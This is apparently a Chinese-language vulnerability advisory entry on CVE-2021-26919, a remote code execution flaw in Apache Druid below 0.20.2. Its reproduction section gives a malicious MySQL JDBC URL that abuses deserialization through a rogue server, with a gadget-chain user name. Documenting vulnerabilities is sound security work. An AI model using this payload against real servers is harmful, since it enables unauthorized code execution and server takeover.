# Apache Druid 远程代码执行漏洞 CVE-2021-26919

## 漏洞描述

Apache Druid 是用Java编写的面向列的开源分布式数据存储，旨在快速获取大量事件数据，并在数据之上提供低延迟查询。2021年3月30日，Apache Druid官方发布安全更新，修复了 CVE-2021-26919 Apache Druid 远程代码执行漏洞。由于Apache Druid 默认情况下缺乏授权认证，攻击者可直接构造恶意请求执行任意代码，控制服务器。

参考链接：

* http://m0d9.me/2021/04/21/Apache-Druid-CVE-2021-26919-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/
* https://help.aliyun.com/noticelist/articleid/1060822985.html

## 漏洞影响

```
Apache Druid < 0.20.2
```

## 漏洞复现

jdbc触发点：https://druid.apache.org/docs/0.19.0/development/extensions-core/druid-lookups.html#polling-lookup

poc:

```
url = "jdbc:mysql://localhost:3307/?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&maxAllowedPacket=65535"
user ="cb1"
password="password"
```

